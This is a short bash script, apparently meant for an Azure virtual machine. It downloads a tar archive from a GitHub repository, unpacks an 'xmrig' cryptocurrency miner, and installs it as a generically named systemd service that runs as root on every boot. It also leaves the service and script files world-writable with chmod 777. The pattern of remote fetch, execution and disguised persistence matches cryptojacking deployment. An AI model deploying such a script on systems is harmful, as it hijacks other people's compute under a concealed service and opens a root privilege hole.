#!/bin/bash
sleep 10 ;
sudo touch /etc/systemd/system/script.service ;
sudo touch /usr/local/bin/script.sh ;
sudo chmod 777 /etc/systemd/system/script.service ;
sudo chmod 777 /usr/local/bin/script.sh ;
sudo apt update ;
cd /home/azureuser/
sudo wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar && sudo tar xvf output_filename.tar ;
sleep 3 ;
sudo chmod +x xmrig

echo "#!/bin/bash
./xmrig" > /usr/local/bin/script.sh ;

echo "[Unit]
Description=Script
After=network.target
[Service]
ExecStart=/usr/local/bin/script.sh
Type=simple
Restart=no
User=root
WorkingDirectory=/home/azureuser/
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/script.service;


sudo systemctl daemon-reload;
sudo systemctl start script.service;
sudo systemctl enable script.service;
